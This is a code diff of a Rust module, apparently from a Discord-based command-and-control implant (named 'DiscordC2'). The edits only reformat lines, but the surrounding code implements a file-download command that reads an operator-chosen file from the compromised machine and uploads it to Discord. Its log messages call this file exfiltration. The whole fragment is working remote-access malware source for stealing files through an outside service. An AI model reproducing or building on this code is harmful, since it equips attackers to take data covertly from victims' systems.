@@ -9,11 +9,7 @@ use serenity::{
 	model::{
 		application::{
 			command::CommandOptionType,
-			interaction::application_command::{
-				ApplicationCommandInteraction,
-				CommandDataOption,
-				CommandDataOptionValue,
-			},
+			interaction::application_command::{ApplicationCommandInteraction, CommandDataOption, CommandDataOptionValue},
 		},
 		channel::AttachmentType,
 	},
@@ -36,16 +32,12 @@ pub fn register(command: &mut CreateApplicationCommand) -> &mut CreateApplicatio
 			option
 				.name("file-path")
 				.kind(CommandOptionType::String)
-				.description(
-					"Relative to the working directory of the session, or an absolute path",
-				)
+				.description("Relative to the working directory of the session, or an absolute path")
 				.required(true)
 		})
 }
 
-pub async fn run(
-	options: &[CommandDataOption],
-) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
+pub async fn run(options: &[CommandDataOption]) -> Result<Option<AttachmentType<'static>>, DiscordC2Error> {
 	let options = options.to_owned();
 	let option = options
 		.get(0)
@@ -69,9 +61,7 @@ async fn path_validator(file_path: &str) -> Result<PathBuf, DiscordC2Error> {
 	let shell_type = SHELL_TYPE.lock().await;
 	let process_handler = (match shell_type.as_ref() {
 		Some(shell_type) => ProcessHandler::instance(shell_type).await,
-		None => Err(DiscordC2Error::InvalidInput(
-			"Shell type not found.".to_string(),
-		)),
+		None => Err(DiscordC2Error::InvalidInput("Shell type not found.".to_string())),
 	})?;
 
 	// Should return a DiscordC2Error::RegexError if not successful
@@ -108,13 +98,9 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
 
 	let file_name = file_path
 		.file_name()
-		.ok_or(DiscordC2Error::InvalidInput(
-			"File name not found.".to_string(),
-		))?
+		.ok_or(DiscordC2Error::InvalidInput("File name not found.".to_string()))?
 		.to_str()
-		.ok_or(DiscordC2Error::InternalError(
-			"Couldn't convert the file name to a string".to_string(),
-		))?;
+		.ok_or(DiscordC2Error::InternalError("Couldn't convert the file name to a string".to_string()))?;
 
 	Ok(AttachmentType::Bytes {
 		data:     Cow::from(final_bytes),
@@ -143,10 +129,7 @@ async fn file_to_attachment(file_path: PathBuf) -> Result<AttachmentType<'static
 /// let result = download_handler(&ctx, &command).await;
 /// assert!(result.is_ok());
 /// ```
-pub async fn download_handler(
-	ctx: &Context,
-	command: &ApplicationCommandInteraction,
-) -> Result<(), DiscordC2Error> {
+pub async fn download_handler(ctx: &Context, command: &ApplicationCommandInteraction) -> Result<(), DiscordC2Error> {
 	let response = send_interaction_response(ctx, command, "Downloading file...", None).await?;
 	let attachment = run(&command.data.options).await;
 
@@ -156,21 +139,11 @@ pub async fn download_handler(
 		Ok(Some(attachment)) => {
 			informational!("Beginning file exfiltration...");
 			tokio::spawn(async move {
-				if let Err(why) = send_follow_up_response(
-					&ctx1,
-					&response,
-					"Successfully exfiltrated the file!",
-					Some(attachment),
-				)
-				.await
-				{
+				if let Err(why) = send_follow_up_response(&ctx1, &response, "Successfully exfiltrated the file!", Some(attachment)).await {
 					error!("Error sending follow up response: {}.", why);
 				}
 
-				if let Err(why) = response
-					.delete_original_interaction_response(&ctx1.http)
-					.await
-				{
+				if let Err(why) = response.delete_original_interaction_response(&ctx1.http).await {
 					error!("Error deleting original interaction response: {}.", why);
 				}
 				informational!("Succesfully exfiltrated the file.");
@@ -178,16 +151,8 @@ pub async fn download_handler(
 		},
 		Err(reason) => {
 			error!("Failed to exfiltrate the file: {}", reason);
-			send_follow_up_response(
-				ctx,
-				&response,
-				format!("Failed to exfiltrate the file: `{}`", reason),
-				None,
-			)
-			.await?;
-			response
-				.delete_original_interaction_response(&ctx.http)
-				.await?;
+			send_follow_up_response(ctx, &response, format!("Failed to exfiltrate the file: `{}`", reason), None).await?;
+			response.delete_original_interaction_response(&ctx.http).await?;
 		},
 		_ => {
 			return Ok(());
